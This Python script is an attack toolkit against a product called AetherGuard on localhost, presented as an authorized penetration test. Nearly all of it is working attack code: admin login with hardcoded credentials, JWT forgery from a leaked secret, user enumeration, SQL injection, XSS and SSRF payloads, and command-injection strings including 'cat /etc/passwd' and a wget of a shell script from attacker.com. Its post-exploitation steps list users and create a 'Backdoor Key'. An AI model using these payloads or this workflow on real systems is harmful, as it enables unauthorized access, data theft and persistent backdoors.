#!/usr/bin/env python3
"""
AetherGuard Attack Simulation Toolkit
=====================================

Comprehensive attack toolkit simulating国家级黑客团队 (APT) attack.

DISCLAIMER: For authorized security testing only!

Vulnerabilities exploited:
1. Hardcoded JWT_SECRET - Token Forgery
2. Hardcoded ADMIN_PASSWORD - Direct Login
3. Fallback Encryption Salt - Agent Key Decryption
"""

import requests
import json
import sys
import time
import subprocess
from typing import Optional, Dict, Any
from urllib.parse import urljoin

# Configuration
TARGET_BASE_URL = "http://localhost:3005"
JWT_SECRET = "supersecretjwtkeythatisatleast32charslong"
ADMIN_EMAIL = "admin@aetherguard.local"
ADMIN_PASSWORD = "admin123456789012345"

class AetherGuardAttacker:
    """APT-style attack toolkit for AetherGuard"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.token = None
        self.user_info = None
        
    def _request(self, method: str, path: str, **kwargs) -> requests.Response:
        """Make HTTP request with optional auth"""
        url = urljoin(self.target_url, path)
        headers = kwargs.pop('headers', {})
        
        if self.token:
            headers['Authorization'] = f'Bearer {self.token}'
        
        return self.session.request(method, url, headers=headers, **kwargs)
    
    # ============================================================
    # ATTACK VECTOR 1: Brute Force Login with Leaked Credentials
    # ============================================================
    def attack_login(self):
        """Try to login with leaked admin credentials"""
        print("\n[*] ATTACK VECTOR 1: Login with leaked credentials")
        print(f"    Email: {ADMIN_EMAIL}")
        print(f"    Password: {ADMIN_PASSWORD}")
        
        response = self._request('POST', '/api/auth/login', json={
            'email': ADMIN_EMAIL,
            'password': ADMIN_PASSWORD
        })
        
        if response.status_code == 200:
            data = response.json()
            if data.get('success') or data.get('message'):
                self.token = data.get('accessToken')
                self.user_info = data.get('user')
                print(f"[+] SUCCESS! Logged in as admin")
                print(f"    Role: {self.user_info.get('role')}")
                return True
        elif response.status_code == 401:
            print(f"[-] Failed: Invalid credentials")
        elif response.status_code == 403:
            print(f"[-] Account locked (too many attempts)")
        
        print(f"    Response: {response.status_code} - {response.text[:100]}")
        return False
    
    # ============================================================
    # ATTACK VECTOR 2: JWT Token Forgery
    # ============================================================
    def attack_jwt_forgery(self):
        """Forge JWT token using leaked secret"""
        print("\n[*] ATTACK VECTOR 2: JWT Token Forgery")
        print(f"    Leaked JWT_SECRET: {JWT_SECRET}")
        
        try:
            import jwt
            import datetime
            
            # Generate forged admin token
            payload = {
                "userId": "forged-admin-id",
                "email": "forged@admin.local",
                "username": "forged_admin",
                "role": "admin",
                "plan": "ultra",
                "tenantId": "master",
                "iat": int(datetime.datetime.now().timestamp()),
                "exp": int((datetime.datetime.now() + datetime.timedelta(days=365)).timestamp())
            }
            
            self.token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
            print(f"[+] SUCCESS! Forged admin token")
            print(f"    Token: {self.token[:50]}...")
            
            # Verify it works
            response = self._request('GET', '/api/auth/me')
            if response.status_code == 200:
                print(f"[+] Token WORKS! Full system access granted")
                return True
            else:
                print(f"[-] Token verification failed: {response.status_code}")
                
        except ImportError:
            print("[-] PyJWT not installed, cannot forge token")
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return False
    
    # ============================================================
    # ATTACK VECTOR 3: Enumerate Users
    # ============================================================
    def attack_user_enumeration(self):
        """Enumerate user accounts (timing attack)"""
        print("\n[*] ATTACK VECTOR 3: User Enumeration")
        
        test_emails = [
            'admin@aetherguard.local',
            'test@test.com',
            'nonexistent@test.com'
        ]
        
        for email in test_emails:
            response = self._request('POST', '/api/auth/login', json={
                'email': email,
                'password': 'wrongpassword'
            })
            
            # Even with wrong password, timing reveals if user exists
            print(f"    {email}: {response.status_code}")
    
    # ============================================================
    # ATTACK VECTOR 4: SQL Injection
    # ============================================================
    def attack_sql_injection(self):
        """Try SQL injection attacks"""
        print("\n[*] ATTACK VECTOR 4: SQL Injection")
        
        payloads = [
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users;--"
        ]
        
        for payload in payloads:
            response = self._request('POST', '/api/auth/login', json={
                'email': payload,
                'password': 'test'
            })
            
            # Check if blocked by WAF/Input validation
            if response.status_code == 400:
                data = response.json()
                if 'invalid_input' in str(data).lower() or 'validation' in str(data).lower():
                    print(f"    Blocked: {payload[:30]}...")
                    continue
            
            print(f"    {payload[:30]}: {response.status_code}")
    
    # ============================================================
    # ATTACK VECTOR 5: XSS
    # ============================================================
    def attack_xss(self):
        """Try XSS attacks"""
        print("\n[*] ATTACK VECTOR 5: XSS")
        
        payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(document.cookie)</script>'
        ]
        
        for payload in payloads:
            response = self._request('POST', '/api/auth/register', json={
                'email': f'test{payload}@test.com',
                'username': 'test',
                'password': 'Test1234!'
            })
            
            if response.status_code == 400:
                print(f"    Blocked: {payload[:30]}...")
            else:
                print(f"    {payload[:30]}: {response.status_code}")
    
    # ============================================================
    # ATTACK VECTOR 6: SSRF
    # ============================================================
    def attack_ssrf(self):
        """Try SSRF attacks"""
        print("\n[*] ATTACK VECTOR 6: SSRF")
        
        if not self.token:
            print("    [-] Need authentication first")
            return
        
        payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/',
            'http://localhost:8080/admin',
            'http://127.0.0.1:3005'
        ]
        
        for payload in payloads:
            response = self._request('POST', '/api/scanner/tasks', json={
                'targets': {
                    'urls': [payload]
                }
            })
            
            if 'ssrf' in response.text.lower() or 'private' in response.text.lower():
                print(f"    Blocked: {payload}")
            else:
                print(f"    {payload}: {response.status_code}")
    
    # ============================================================
    # ATTACK VECTOR 7: Command Injection
    # ============================================================
    def attack_command_injection(self):
        """Try command injection via IP parameter"""
        print("\n[*] ATTACK VECTOR 7: Command Injection")
        
        if not self.token:
            print("    [-] Need authentication first")
            return
        
        payloads = [
            '8.8.8.8; ls -la',
            '8.8.8.8 && cat /etc/passwd',
            '8.8.8.8 | wget http://attacker.com/sh.sh',
            '$(whoami)',
            '`id`'
        ]
        
        # Try through WebSocket or firewall endpoint
        for payload in payloads:
            # This would be tested through the WebSocket interface
            print(f"    Payload: {payload}")
    
    # ============================================================
    # POST-EXPLOITATION: After gaining access
    # ============================================================
    def post_exploit_list_users(self):
        """List all users after gaining access"""
        print("\n[*] POST-EXPLOITATION: List Users")
        
        if not self.token:
            print("    [-] No authentication")
            return
        
        response = self._request('GET', '/api/admin/users')
        
        if response.status_code == 200:
            data = response.json()
            users = data.get('users', [])
            print(f"[+] Found {len(users)} users:")
            for user in users[:5]:
                print(f"    - {user.get('email')} ({user.get('role')})")
        else:
            print(f"    Failed: {response.status_code}")
    
    def post_exploit_create_api_key(self):
        """Create API key after gaining access"""
        print("\n[*] POST-EXPLOITATION: Create API Key")
        
        if not self.token:
            print("    [-] No authentication")
            return
        
        response = self._request('POST', '/api/admin/api-keys', json={
            'name': 'Backdoor Key'
        })
        
        if response.status_code == 201:
            data = response.json()
            api_key = data.get('data', {}).get('apiKey')
            print(f"[+] Created backdoor API key:")
            print(f"    {api_key}")
        else:
            print(f"    Failed: {response.status_code}")
    
    def post_exploit_list_agents(self):
        """List all registered agents"""
        print("\n[*] POST-EXPLOITATION: List Security Agents")
        
        if not self.token:
            print("    [-] No authentication")
            return
        
        response = self._request('GET', '/api/agents')
        
        if response.status_code == 200:
            data = response.json()
            agents = data.get('data', []) if isinstance(data, dict) else data
            print(f"[+] Found {len(agents)} agents:")
            for agent in agents:
                print(f"    - {agent.get('hostname')} ({agent.get('status')})")
        else:
            print(f"    Failed: {response.status_code}")


def main():
    print("=" * 70)
    print(" AetherGuard APT Attack Simulation")
    print(" Simulating 国家级黑客团队 (State-Sponsored Attack)")
    print("=" * 70)
    
    attacker = AetherGuardAttacker(TARGET_BASE_URL)
    
    # Phase 1: Initial Access
    print("\n" + "=" * 70)
    print(" PHASE 1: INITIAL ACCESS")
    print("=" * 70)
    
    # Try leaked credentials first
    attacker.attack_login()
    
    # If failed, try JWT forgery
    if not attacker.token:
        attacker.attack_jwt_forgery()
    
    # Phase 2: Enumeration
    print("\n" + "=" * 70)
    print(" PHASE 2: ENUMERATION & RECON")
    print("=" * 70)
    
    attacker.attack_user_enumeration()
    
    # Phase 3: Exploitation Attempts
    print("\n" + "=" * 70)
    print(" PHASE 3: EXPLOITATION ATTEMPTS")
    print("=" * 70)
    
    attacker.attack_sql_injection()
    attacker.attack_xss()
    
    # Phase 4: Post-Exploitation (if successful)
    if attacker.token:
        print("\n" + "=" * 70)
        print(" PHASE 4: POST-EXPLOITATION")
        print("=" * 70)
        
        attacker.post_exploit_list_users()
        attacker.post_exploit_create_api_key()
        attacker.post_exploit_list_agents()
    else:
        print("\n[-] No access gained - attack failed")
    
    print("\n" + "=" * 70)
    print(" ATTACK SIMULATION COMPLETE")
    print("=" * 70)


if __name__ == "__main__":
    main()
